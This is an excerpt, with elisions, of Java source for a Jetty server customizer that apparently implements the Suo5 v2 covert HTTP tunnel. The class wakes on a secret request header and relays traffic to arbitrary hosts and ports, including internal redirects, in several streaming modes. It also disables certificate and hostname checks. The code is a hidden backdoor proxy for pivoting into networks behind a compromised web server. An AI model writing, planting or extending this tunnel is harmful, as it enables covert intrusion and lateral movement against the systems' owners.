 ...
 * @since 2025/12/9
 */
public class Suo5v2JettyCustomizer implements HttpConfiguration.Customizer, Runnable, HostnameVerifier, X509TrustManager {
    public static String headerName;
    public static String headerValue;
    private static HashMap addrs = collectAddr();
    private static Hashtable ctx = new Hashtable();
    private static ThreadLocal<Boolean> once = new ThreadLocal<Boolean>();
    ...
    public Suo5v2JettyCustomizer(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2JettyCustomizer(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public void customize(Connector connector, HttpConfiguration channelConfig, Request request) {
        try {
            ...
            if (value != null && value.contains(headerValue)) {
                new Suo5v2JettyCustomizer().process(request, response);
    ...
    private void process(Object request, Object response) {
        String sid = null;
        byte[] bodyPrefix = new byte[0];
        try {
            InputStream reqInputStream = (InputStream) request.getClass().getMethod("getInputStream").invoke(request);
            ...
            switch (mode) {
                case 0x00:
                    sid = randomString(16);
                    processHandshake(request, response, dataMap, tunId, sid);
                    break;
                case 0x01:
                    setBypassHeader(response);
                    processFullStream(request, response, dataMap, tunId);
                    break;
                case 0x02:
                    setBypassHeader(response);
                ...
                case 0x03:
                    ...
                    if (processRedirect(request, response, dataMap, bodyPrefix, bodyContent)) {
                    ...
                    if (sidData == null || sidData.length == 0 || getKey(new String(sidData)) == null) {
                        ...
                        response.getClass().getMethod("setStatus", int.class).invoke(response, 403);
                        return;
                    }
                    ...
                    if (mode == 0x02) {
                        // half mode
                        writeAndFlush(response, processTemplateStart(response, new String(sidData)), dirySize);
                        do {
                            processHalfStream(request, response, dataMap, tunId, dirySize);
                            try {
                        ...
                        writeAndFlush(response, processTemplateEnd(sid), dirySize);

                    } else {
                        // classic mode
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        baos.write(processTemplateStart(response, new String(sidData)));

                        do {
                            processClassic(request, baos, dataMap, tunId);
                            try {
                                dataMap = unmarshalBase64(bodyStream);
                                if (dataMap.isEmpty()) {
                                    break;
                        ...
                        response.getClass().getMethod("setContentLength", int.class).invoke(response, baos.size());
                        writeAndFlush(response, baos.toByteArray(), 0);
                    }
    ...
    private void setBypassHeader(Object resp) throws Exception {
        resp.getClass().getMethod("setBufferSize", int.class).invoke(resp, BUF_SIZE);
        resp.getClass().getMethod("setHeader", String.class, String.class).invoke(resp, "X-Accel-Buffering", "no");
    }

    private byte[] processTemplateStart(Object resp, String sid) throws Exception {
        ...
        resp.getClass().getMethod("setHeader", String.class, String.class).invoke(resp, "Content-Type", tplParts[0]);
    ...
    private boolean processRedirect(Object req, Object resp, HashMap dataMap, byte[] bodyPrefix, byte[] bodyContent) throws Exception {
    ...
    private void processHandshake(Object req, Object resp, HashMap dataMap, String tunId, String sid) throws Exception {
        byte[] redirectData = (byte[]) dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        if (needRedirect && !isLocalAddr(new String(redirectData))) {
        ...
        if (isAuto) {
            ...
            baos.write(processTemplateEnd(sid));
            resp.getClass().getMethod("setContentLength", int.class).invoke(resp, baos.size());
            writeAndFlush(resp, baos.toByteArray(), 0);
        }
    }

    private void processFullStream(Object req, Object resp, HashMap dataMap, String tunId) throws Exception {
        InputStream reqInputStream = (InputStream) req.getClass().getMethod("getInputStream").invoke(req);
...
//
    ...
    private void processClassic(Object req, ByteArrayOutputStream respBodyStream, HashMap dataMap, String tunId) throws
            Exception {
        boolean sendClose = true;
    ...
    private byte[] performCreate(Object request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
        if (port == 0) {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2JettyCustomizer(tunId, 1)).start();
                new Thread(new Suo5v2JettyCustomizer(tunId, 2)).start();
            }
        } catch (Exception e) {
    ...
    private int getServerPort(Object request) throws Exception {
        int port;
        try {
    ...
    private HttpURLConnection redirect(Object request, String rUrl, byte[] body) throws Exception {
        ...
        while (headers.hasMoreElements()) {
            ...
            if (k.equalsIgnoreCase("Content-Length")) {
                ...
                conn.setRequestProperty(k, (String) request.getClass().getMethod("getHeader", String.class).invoke(request, k));
            }
        }
